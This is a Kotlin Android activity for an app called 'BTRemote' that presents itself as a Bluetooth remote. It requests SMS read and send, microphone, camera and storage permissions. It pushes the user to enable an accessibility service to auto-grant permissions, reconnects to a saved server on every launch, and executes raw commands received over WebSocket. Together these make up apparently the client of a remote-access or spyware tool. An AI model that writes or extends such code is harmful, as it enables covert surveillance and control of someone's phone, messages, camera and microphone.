package com.example.btremote

import android.Manifest
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

/**
 * Main Activity
 *
 * This activity:
 * 1. Requests necessary Bluetooth permissions
 * 2. Starts BLE GATT server
 * 3. Displays connection status
 * 4. Handles incoming commands
 *
 * Permission requirements (Android 12+):
 * - BLUETOOTH_CONNECT: Required for BLE operations
 * - BLUETOOTH_ADVERTISE: Required for advertising
 * - BLUETOOTH_SCAN: Required for scanning (not needed for server, but good practice)
 *
 * Permission requirements (Android 11 and below):
 * - BLUETOOTH: Basic Bluetooth operations
 * - BLUETOOTH_ADMIN: Administrative operations
 * - ACCESS_FINE_LOCATION: Required for BLE scanning
 */
class MainActivity : AppCompatActivity() {
    
    companion object {
        private const val TAG = "BTRemote-Main"
        private const val REQUEST_ENABLE_BT = 1
    }
    
    private lateinit var statusText: TextView
    private lateinit var startButton: Button
    private lateinit var stopButton: Button
    private lateinit var ipInput: android.widget.EditText
    private lateinit var connectWifiButton: Button
    
    private var gattServer: BleGattServer? = null
    private var commandExecutor: CommandExecutor? = null
    private var webSocketManager: WebSocketManager? = null
    
    private var nsdManager: android.net.nsd.NsdManager? = null
    private var discoveryListener: android.net.nsd.NsdManager.DiscoveryListener? = null
    
    private var isServerRunning = false
    
    /**
     * Permission launcher for Android 12+
     */
    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val allGranted = permissions.entries.all { it.value }
        if (allGranted) {
            Log.i(TAG, "All permissions granted")
            updateStatus("Permissions granted. Ready to start.")
        } else {
            Log.e(TAG, "Some permissions denied")
            updateStatus("ERROR: Permissions required!")
        }
    }
    
    /**
     * Bluetooth enable launcher
     */
    private val enableBluetoothLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK) {
            Log.i(TAG, "Bluetooth enabled")
            startGattServer()
        } else {
            Log.e(TAG, "Bluetooth not enabled")
            updateStatus("ERROR: Bluetooth required!")
        }
    }
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        statusText = findViewById(R.id.statusText)
        startButton = findViewById(R.id.startButton)
        stopButton = findViewById(R.id.stopButton)
        ipInput = findViewById(R.id.ipInput)
        connectWifiButton = findViewById(R.id.connectWifiButton)
        
        // Initialize CommandExecutor for WiFi
        val prefs = getSharedPreferences("BTRemotePrefs", MODE_PRIVATE)
        
        // Check if Accessibility Service is enabled
        if (!isAccessibilityServiceEnabled()) {
            promptEnableAccessibilityService()
        }
        
        val wifiExecutor = CommandExecutor(this, useChunking = false) { response ->
            webSocketManager?.sendMessage(response)
        }
        
        webSocketManager = WebSocketManager(
            onMessageReceived = { message ->
                runOnUiThread {
                    try {
                        // Pass raw JSON string directly to executor
                        wifiExecutor.execute(message)
                    } catch (e: Exception) {
                        Log.e(TAG, "Error executing WiFi command: ${e.message}")
                    }
                }
            },
            onConnectionChanged = { connected, error ->
                runOnUiThread {
                    if (connected) {
                        updateStatus("✓ Connected to Server\nReady for commands.")
                    } else {
                        val msg = error ?: "Unknown error"
                        updateStatus("Disconnected: $msg")
                    }
                }
            }
        )
        
        // Load saved server IP and auto-connect (AFTER WebSocketManager is initialized)
        val savedIp = prefs.getString("server_ip", "")
        if (!savedIp.isNullOrEmpty()) {
            ipInput.setText(savedIp)
            // Auto-connect on launch if IP is saved
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                connectToWifi(savedIp)
            }, 500) // Small delay to ensure UI is ready
        }
        
        startButton.setOnClickListener {
            checkPermissionsAndStart()
        }
        
        stopButton.setOnClickListener {
            stopGattServer()
        }
        
        connectWifiButton.setOnClickListener {
            val ip = ipInput.text.toString()
            if (ip.isNotEmpty()) {
                connectToWifi(ip)
            }
        }
        
        updateStatus("Ready. Searching for server...")
        updateButtonStates()
        
        // Start Auto-Discovery
        startDiscovery()
    }
    
    private fun connectToWifi(ip: String) {
        updateStatus("Connecting to $ip...")
        
        // Save server IP for auto-connect
        val prefs = getSharedPreferences("BTRemotePrefs", MODE_PRIVATE)
        prefs.edit().putString("server_ip", ip).apply()
        
        webSocketManager?.connect(ip)
    }
    
    private fun startDiscovery() {
        nsdManager = getSystemService(android.content.Context.NSD_SERVICE) as android.net.nsd.NsdManager
        
        discoveryListener = object : android.net.nsd.NsdManager.DiscoveryListener {
            override fun onDiscoveryStarted(regType: String) {
                Log.d(TAG, "Service discovery started")
            }

            override fun onServiceFound(service: android.net.nsd.NsdServiceInfo) {
                Log.d(TAG, "Service found: " + service.serviceName)
                if (service.serviceType.contains("_btremote._tcp")) {
                    nsdManager?.resolveService(service, object : android.net.nsd.NsdManager.ResolveListener {
                        override fun onResolveFailed(serviceInfo: android.net.nsd.NsdServiceInfo, errorCode: Int) {
                            Log.e(TAG, "Resolve failed: $errorCode")
                        }

                        override fun onServiceResolved(serviceInfo: android.net.nsd.NsdServiceInfo) {
                            Log.i(TAG, "Service resolved: " + serviceInfo.host.hostAddress)
                            val ip = serviceInfo.host.hostAddress
                            runOnUiThread {
                                ipInput.setText(ip)
                                updateStatus("Found Server: $ip\nClick CONNECT to join.")
                                // Optional: Auto-connect
                                // connectToWifi(ip) 
                            }
                        }
                    })
                }
            }

            override fun onServiceLost(service: android.net.nsd.NsdServiceInfo) {
                Log.e(TAG, "service lost: $service")
            }

            override fun onDiscoveryStopped(serviceType: String) {
                Log.i(TAG, "Discovery stopped: $serviceType")
            }

            override fun onStartDiscoveryFailed(serviceType: String, errorCode: Int) {
                Log.e(TAG, "Discovery failed: Error code:$errorCode")
                nsdManager?.stopServiceDiscovery(this)
            }

            override fun onStopDiscoveryFailed(serviceType: String, errorCode: Int) {
                Log.e(TAG, "Discovery failed: Error code:$errorCode")
                nsdManager?.stopServiceDiscovery(this)
            }
        }
        
        try {
            nsdManager?.discoverServices("_btremote._tcp.", android.net.nsd.NsdManager.PROTOCOL_DNS_SD, discoveryListener)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start discovery: ${e.message}")
        }
    }
    
    /**
     * Check and request necessary permissions.
     */
    private fun checkPermissionsAndStart() {
        val permissions = mutableListOf<String>()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            // Android 12+ (API 31+)
            permissions.add(Manifest.permission.BLUETOOTH_SCAN)
            permissions.add(Manifest.permission.BLUETOOTH_ADVERTISE)
            permissions.add(Manifest.permission.BLUETOOTH_CONNECT)
        } else {
            // Android 11 and below
            permissions.add(Manifest.permission.BLUETOOTH)
            permissions.add(Manifest.permission.BLUETOOTH_ADMIN)
            permissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
        }
        
        // Storage permissions
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // Android 13+ (API 33+) - Granular media permissions
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(Manifest.permission.READ_MEDIA_AUDIO)
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            // Android 12 and below
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        
        // SMS permission
        permissions.add(Manifest.permission.SEND_SMS)
        permissions.add(Manifest.permission.READ_SMS)
        
        // Audio Recording permission
        permissions.add(Manifest.permission.RECORD_AUDIO)
        
        // Camera permission
        permissions.add(Manifest.permission.CAMERA)
        
        val permissionsToRequest = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        
        if (permissionsToRequest.isNotEmpty()) {
            Log.i(TAG, "Requesting permissions: $permissionsToRequest")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                requestPermissionLauncher.launch(permissionsToRequest.toTypedArray())
            } else {
                ActivityCompat.requestPermissions(this, permissionsToRequest.toTypedArray(), 100)
            }
        } else {
            checkBluetoothAndStart()
        }
    }
    
    /**
     * Check if Bluetooth is enabled and start server.
     */
    private fun checkBluetoothAndStart() {
        val bluetoothManager = getSystemService(BLUETOOTH_SERVICE) as BluetoothManager
        val bluetoothAdapter = bluetoothManager.adapter
        
        if (bluetoothAdapter == null) {
            updateStatus("ERROR: Bluetooth not supported!")
            return
        }
        
        if (!bluetoothAdapter.isEnabled) {
            Log.i(TAG, "Bluetooth not enabled, requesting enable")
            val enableBtIntent = Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE)
            enableBluetoothLauncher.launch(enableBtIntent)
        } else {
            startGattServer()
        }
    }
    
    /**
     * Start GATT server service.
     */
    private fun startGattServer() {
        if (isServerRunning) {
            Log.w(TAG, "Server already running")
            return
        }
        
        Log.i(TAG, "Starting GATT server service...")
        updateStatus("Starting service...")
        
        val serviceIntent = Intent(this, BluetoothService::class.java)
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        
        isServerRunning = true
        updateStatus("✓ Service Running\n✓ Background Active\n\nWaiting for connection...")
        updateButtonStates()
    }
    
    /**
     * Stop GATT server service.
     */
    private fun stopGattServer() {
        if (!isServerRunning) {
            Log.w(TAG, "Server not running")
            return
        }
        
        Log.i(TAG, "Stopping GATT server service...")
        updateStatus("Stopping service...")
        
        val serviceIntent = Intent(this, BluetoothService::class.java)
        stopService(serviceIntent)
        
        isServerRunning = false
        updateStatus("Service stopped.")
        updateButtonStates()
    }
    
    /**
     * Update status text on UI.
     */
    private fun updateStatus(status: String) {
        runOnUiThread {
            statusText.text = status
        }
    }
    
    /**
     * Update button enabled states.
     */
    private fun updateButtonStates() {
        runOnUiThread {
            startButton.isEnabled = !isServerRunning
            stopButton.isEnabled = isServerRunning
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        stopGattServer()
    }
    
    /**
     * Handle permission request result (Android 11 and below).
     */
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        if (requestCode == 100) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            if (allGranted) {
                checkBluetoothAndStart()
            } else {
                updateStatus("ERROR: Permissions required!")
            }
        }
    }
    
    private fun isAccessibilityServiceEnabled(): Boolean {
        val accessibilityEnabled = android.provider.Settings.Secure.getInt(
            contentResolver,
            android.provider.Settings.Secure.ACCESSIBILITY_ENABLED,
            0
        )
        
        if (accessibilityEnabled == 1) {
            val services = android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            )
            return services?.contains(packageName) == true
        }
        
        return false
    }
    
    private fun promptEnableAccessibilityService() {
        val dialog = androidx.appcompat.app.AlertDialog.Builder(this)
            .setTitle("Enable Auto-Permission")
            .setMessage("To automatically grant permissions, please enable the BTRemote Accessibility Service in Settings.\n\nThis is required for automatic permission granting.")
            .setPositiveButton("Open Settings") { _, _ ->
                val intent = Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS)
                startActivity(intent)
            }
            .setNegativeButton("Skip", null)
            .create()
        dialog.show()
    }
}
